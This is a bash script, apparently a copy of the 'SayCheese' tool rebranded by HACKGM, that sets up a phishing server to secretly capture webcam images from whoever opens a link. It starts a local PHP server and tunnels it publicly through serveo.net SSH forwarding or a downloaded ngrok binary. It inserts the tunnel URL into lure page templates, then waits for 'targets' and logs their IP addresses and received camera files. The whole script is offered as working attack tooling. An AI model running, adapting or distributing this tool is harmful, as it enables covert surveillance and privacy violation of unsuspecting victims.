#!/bin/bash
# SayCheese v1.0
# coded by: github.com/HACKGM/hackwebcam
# If you use any part from this code, giving me the credits. Read the Lincense!

trap 'printf "\n";stop' 2

banner() {

printf "\e[1;92m 

                MMMMMMMM,                                                                                                                                                      IMMMMMM+                 
             :    ,MMMMMMMN                                                                                                                                                 .MMMMMM:      .,            
         NMMMMM.     .MMMMMM                                                                                                                                               DMMMMM       .MMMMMMM~       
      MMMMMMMMMMMD      ZMMMMM                                                                                                                                           ~MMMMM     ,MMMMMMMMMMMMMM     
   .MMMMMMMMMMMMMMMMM,    ~MMMM:                                                                                                                                        MMMMM    MMMMMMMMMMMMMMMMMMM+   
  NMMMMMMMMMMMMMMMMMMMMM    MMMM                                                                                                                                       MMMMM    MMMMMMMMMMMMMMMMMMMMMZ  
 MMMMMMMMMMMMMMMMMMMMMMMMM.  MMMM$                                                                                                                                   :MMMM~   MMMMMMMMMMMMMMMMMMMMMMMM+ 
MMMMMMMMMMMMMMMMMMMMMMMMMMMMO MMMMM                                                                                                                                 NMMMM   8MMMMMMMMMMMMMMMMMMMMMMMMMM 
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM                                                                                                                               7MMMM   MMMMMMMMMMMMMMMMMMMMMMMMMMMM:
MMMMMMMMMMDMMMMMMMMMMMMMMMMMMMMMMMMMO                                                                                                                             NMMMM~  MMMMM8 MMMMMMMMMMM~MMMMMMMMMM?
MMMMMMMM MM MMMMMN=MMMMMMMMMMMMMMMMMMN                                                                                                                           MMMMM8 7MMMMMM  .M$  MMMMM  MMMMMMMMMM=
ZMMMMMMM 7MM OMMM+ MM$ MMMMMMMMMMMMMMMD                                                                                                                         MMMMMM  MMMMMM        MMMO  MMMMMMMMMMM 
 MMMMMMM  MM8         MMMMMMMMMMMMMMMMMM                                             .IMMMMMMMMMMMMMMMMMDI,                                                    MMMMMMMMMMMMMM7            ,MMMMMMMMMMMM 
  MMMMMMM ?MM7::.   :MMMMMMMMMMMMMMMMMMMM.                                     +MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM?                                            MMMMMMMMMMMMMMM          :MMMMMMMMMMMMMM  
   MMMMMMM MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM                                 NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMD                                       MMMMMMMMMMMMMMMD      MMMMMMMMMMMMMMMMMM~  
    MMMMMMM DMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM~                             NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMI                                  MMMMMMMMMMMMMMMM    8MMMMMMMMMMMMMMMMMMM,   
     MMMMMMM .MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM:                         MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM~                             .MMMMMMMMMMMMMMMM   MMMMMMMMMMMMMMMMMMMMM     
      ,MMMMMM  MMMMMMMMMMMMMMMMMMMMMMMMMOMMMMMMM                       MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM:                          7MMMM,8MMMMMMMMMM  MMMMMMMMMMMMMMMMMMMMMM      
        ~MMMMM=.M   +MMMMMMMMMMMMMMMMMMMM?  MMMMMN                   MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM                       $MMMM  MMMMMMMMMMMMMMMMMM8$MMMMMMMMMMMMMM        
           $MMMMM        $MMMMMMMMMMMMMMMMM   MMMMM~                MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMD                   IMMMM  7MMMMMMMMMMMMMM~        OMMMMMMMM,          
                              NMMMMMMMMMMMMMM   MMMMM             MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMO               ?MMMN   MMMMMMMMMMMM                                 
                                 =MMMMMMMMMMMMZ  ~MMMMM          MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM            NMMM?  .MMMMMMMMMMM                                    
                                    8MMMMMMMMMMM   MMMMMD       MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM         +MMMM   MMMMMMMMMM$                                      
                                       ZMMMMMMMMMN  :MMMMM8   ,MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM      DMMMM   NMMMMMMMMM:                                        
                                          MMMMMMMMMD  :MMMMM =MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   NMMMM,   MMMMMMMMM                                          
                                            MMMMMMMMM    ,M  MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   MMMM   IMMMMMMMM:                                            
                                              NMMMMMMMM     MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   MM   MMMMMMMM                                               
                                                MMMMMMMM   NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMO     ,MMMMMMM?                                                
                                                  MMMMMM  .MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM    DMMMMMMN                                                  
                                                   .MMMN  MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM7  DMMMMMM                                                    
                                                     MM  .MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  $MMMM                                                      
                                                      =  NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM. IMM,                                                       
                                                         MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN +I                                                         
                                                         MMMMM MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM8MMMMMMM                                                            
                                                         MMMMM+8MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM8MMMMMMM                                                            
                                                         MMMMMM.MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMZ8MMMMMMM                                                            
                                                         MMMMMM MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM 8MMMMMMM,                                                           
                                                         MMMMMM NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMMM:                                                           
                                                       ,MMM MMM IMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  MMMMMMMMZ                                                           
                                                        :MMM+8MM~ DMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM IMMM MMMMZ                                                           
                                                        ~MMMM MMM  MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  MMM  ZMMM$                                                           
                                                        ZMMMMM MMZ MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM .MM:  MMMM:                                                           
                                                        ZMMMMM. MM MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM 7MN   MMMM.                                                           
                                                        ZM$  MM MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM 8M    MMMM                                                            
                                                        :MMM  M  MMMMMMMMMMMMMMMMMMMMMIMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM NM   MMMMM                                                            
                                                        :MMM.    MMMMMMMI                 :MMMMMMMMMMMMMMM8             ,NMMMMMMM:    .MMMMM                                                            
                                                         MMM$   .MMMMZ                    ,MMMMMMMMMMMMMMMM                 .MMMMM    MMMMM=                                                            
                                                         MMMD   MMMM                       MMMMMMMMMMMMMMM.                    MMMM   MMMMM                                                             
                                                         MMMD  =MMM~                       MMMM.DMMM,MMMMN                      MMMM  MMMMO                                                             
                                                          MMD  MMMM                        IMM8MMMMMMMMMM,                      NMMMM MMMO                                                              
                                                          MM$ MMMMM.                       ,MMMDMMMMMMMMM,                      OMMMM  MMO                                                               
                                                           MNNMMMMM.                       MMMM MMMMMMMMM,                      OMMM   MM                                                                
                                                           IMMDMMMM:                      DMMMM MMMMMMMMM8                      7MMMMMMMM                                                               
                                                            MMMMMMMZ                      MMMMMMMMMMMMMMMM                      OMMMMMMMM                                                                
                                                             MMMMMMM                      MMMMMMMMMMMMMMMM                      DMMMMMMM                                                                
                                                              MMMMMM                    MMMMMMMMMMMMMMMMMMMM                    MMMMMMM                                                             
                                                             MMMMMMMM               MMMMMMMMMMMM    MMMMMMMMMM                  MMMMMMMMM                                                              
                                                            MMMMMMMMMM       MMMMMMMMMMMMMMMMMMM    MMMMMMMMMMMMMMMM           MMMMMMMMMMM                                                             
                                                           MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM     MMMMMMMMMMMMMMMMMMMMMNMMMMMMMMMMMMMM                                                              
                                                
                                                           MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMZ        MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM                                                                
                                                            MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM$         ?MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM                                                                 
                                                              MMMMMMMMMMMMMMMMMMMMMMMMMMMMMM           MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM                                                                  
                                                                MMMMMMMMMMMMMMMMMMMMMMMMMMM            +MMMMMMMMMMMMMMMMMMMMMMMMMMMMM                                                                   
                                                                 MMMMMMMMMMMMMMMMMMMMMMMMMN             MMMMMMMMMMMMMMMMMMMMMMMMMMMN                                                                    
                                                                   MMMMMMMMMMMMMMMMMMMMMMMD            .MMMMMMMMMMMMNMMMMMMMMMMMMM                                                                      
                                                                    ,    :NMMMMMMMMMMMMMMM            MMMMMMMMMMMMD          .    :MMN,                                                                
                                                                  =     Z7:   MMMMMMMMMMMMMM          MMMMMMMMMMMMM +  ZMMZ       MMMMMMM                                                               
                                                              NM  ,MO MOIMMO   MMMMMMMMMMMMMMMN     MMMMMMMMMMMMMMM MM~    8     MMMMMMMMMM                                                             
                                                            MMMM+  MM MM N      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMM  :+     MMMMMMMMMMMN                                                           
                                                          MMMMMMN  MM ?M     MI MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.MMMM  M  M+  MMMMMMMMMMMMMM                                                         
                                                        NMMMMMMMM  MM .M.  .MMN,MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMM NN  M+   MMMMMMMMMMMMMMO                                                       
                                                      DMMMMMMMMMM  MM? MM   MMM +MMMMMMMMMMMMMMMMMMMMMMMMMMM=MM M~N MM7  M, MM      MMMMMMMMMMMMMMN                                                    
                                                    DMMMMMMMMMMMM  MMM MM   ,MMM:~ 7MMMMMMMMMMMMMMMMMMMMMMMM MO D .?M   MM  MD       NMMMMMMMMMMMMMM7                                                   
                                                  MMMMMMMMMMMMMM   MMM DMN   :MM+ M         :OMMMMMMMMM+  MM   M,M,M  8 MZ  MM         MMMMMMMMMMMMMMMM                                                 
                                                MMMMMMMMMMMMMM?    MMM $MM+ MI  : 8  8= M ?M  ZM   $8  M ZMM M M,M,   MMM   MM           MMMMMMMMMMMMMMMM.                                              
                                             ,MMMMMMMMMMMMMMN      MMM  MMM=MM,7+    M.~MZNM MMM  MM8 MM NMM M D  7  MMMM   MM7           OMMMMMMMMMMMMMMMM+                                            
                                           NMMMMMMMMMMMMMMM        +MM  MMMMMMM +=MM N MMM.M MMM= MMO MM MMM  8 M  .MMMMD   MMM             MMMMMMMMMMMMMMMMMM                                          
                                        $MMMMMMMMMMMMMMMM           M$  MMMMMMMM  MMZM .MM M MMM~ MMO ~~ M$   N M MMMMMM,   MMM               MMMMMMMMMMMMMMMMMMN.                                      
                                      MMMMMMMMMMMMMMMMM,            M M MMMMMMMMM~  NM M ?,            .MM  N N +MMMMMMM    MMM                 MMMMMMMMMMMMMMMMMMMMD.                                  
                                   MMMMMMMMMMMMMMMMMM:               OM MMMMMMMMMMM?   M MM MM M MMDMM MMM+DN $MMMMMMMMM    MMM                   MMMMMMMMMMMMMMMMMMMMMMMMMMN$                          
                 ,?$MMMMMM=    +MMMMMMMMMMMMMMMMMMMI                    MMMMMMMMMMMMMMMM8MM MM D MMMMM~MMM. MMMMMMMMMMMM   . Z                  MZ  MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM?                  
          7MMMMMMMMMI.      NMMMMMMMMMMMMMMMMMMMMM                      DMMMMMMMMMMMMMMMMM, +M  =      M  ~MMMMMMMMMMMMM   M                     +MM  MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM=             
       MMMMMMMMM+ZMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM                         MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM8                          ZMM  MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMO         
     MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  7M                        OMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMD                            MMM  MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMZ      
    MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM,  M.                          ,MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM$                              =MMO .MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM$    
   MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  MM                              MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM=                                 MMM~ NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   
  MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMI 8M                                  =MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM                                     MMM  MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
 ?MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM. MM                                     ZMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM$                                       MMM  MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
 MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM ZM,                                       :MMMMMMMMMMMMMMMMMMMMMMMMMMMMMM7                                          $MM8 ZMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMZ  
 MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM OM                                           MMMMMMMMMMMMMMMMMMMMMMMMMMMD                                             ,MM$ +MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   
  MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  MM                                             MMMMMMMMMMMMMMMMMMMMMMMM.                                                 MMM ,MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM    
   MMMMMMM. DMMMMMMMMMMMMMMMMMMMMMM ,M:                                                MMMMMMMMMMMMMMMMMMM=                                                     MMM DMMMMMMMMMMMMMMMMMMMMMMMMOMMMMM     
    +MMM:   MMMMMMMMMMMMMMMMMMMMMM  M,                                                   DMMM7 ,MMMMMMM~                                                         NMM MMMMMMMMMMMMMMMMMMMMMMMM.          
          MMMMMMMMMMMMMMMMMMMMMMM$ M                                                                                                                              IMO MMMMMMMMMMMMMMMMMMMMMMMMMM        
      ,MMMMMMMMMMMMMMMMMMMMMMMMMM +,                                                                                                                               ~M,NMMMMMMMMMMMMMMMMMMMMMMMMM       
        MMMMMMMMMMMMMMMMMMMMMMMM~ D                                                                                                                                 MM MMMMMMMMMMMMMMMMMMMMMMMM         
                   ZMMMMMMMMMMMMMMMMMMMMMM:M                                                                                                                                   NMMMMMMMMMMMMMMMMMMMMMM,                    
       ,MMMMMMMMMMMMMMMMMMMMMM                                                                                                                                     MMMMMMMMMMMMMMMMMMMMM             
           :MMMMMMMMMMMMMMMMMMMMM                                                                                                                                     +MMMMMMMMMMMMMMMMMMMM             
            MMMMMMMMMM8MMMMMMMMMD                                                                                                                                     ~MMMMMMMM:?MMMMMMMMMM             
            MMMMMMMM.  MMMMMMMMM+                                                                                                                                     ~MMMMMMM     IMMMMMMMM            
            MMMMMMM8     MMMMMMMI                                                                                                                                     ,MMMMMMM       MMMMMMM            
           ,MMMMM?      =MMMMMMMM                                                                                                                                     ,MMMMMMMMM      .MMMMM            
           =MMMO      MMMMMMMMMM                                                                                                                                       MMMMMMMMMM,      MMMM            
           8MM.      MMMMMMNMMN                                                                                                                                            MMMMMM.       7MM            
                                                                                                                                                                                   DM         MMMMMM                                                                                                                                              :MMM$                   
                          MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMZ      DMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM                                           
\e[0m\e"

printf "\e[1;92m   饾檭饾樇饾樉饾檰 饾檼饾檧饾樈饾樉饾樇饾檲 馃摳\e[0m\e   \e[0m\n"
printf "\e[1;92m   Canal telegram: T.me/HACKGM\e[0m                                 \n"

printf " \e[1;77m v1.0 coded by https://github.com/HACKGM/cam\e[0m \n"

printf "\n"


}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}

dependencies() {


command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
 


}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt


}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
rm -rf ip.txt

fi

sleep 0.5

if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] 馃摜Cam file received!\e[0m\n"
rm -rf Log.log
fi
sleep 0.5

done 

}


server() {

command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }

printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

if [[ $subdomain_resp == true ]]; then

$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &

sleep 8
else
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &

sleep 8
fi
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &
sleep 3
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link

}


payload_ngrok() {

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
sed 's+forwarding_link+'$link'+g' saycheese.html > index2.html
sed 's+forwarding_link+'$link'+g' template.php > index.php


}

ngrok_server() {


if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi

else
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link

payload_ngrok
checkfound
}

start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server -eq 1 ]]; then

command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
start

elif [[ $option_server -eq 2 ]]; then
ngrok_server
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
start1
fi

}


payload() {

send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)

sed 's+forwarding_link+'$send_link'+g' saycheese.html > index2.html
sed 's+forwarding_link+'$send_link'+g' template.php > index.php


}

start() {

default_choose_sub="Y"
default_subdomain="saycheese$RANDOM"

printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
read choose_sub
choose_sub="${choose_sub:-${default_choose_sub}}"
if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
subdomain_resp=true
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
read subdomain
subdomain="${subdomain:-${default_subdomain}}"
fi

server
payload
checkfound

}

banner
dependencies
start1
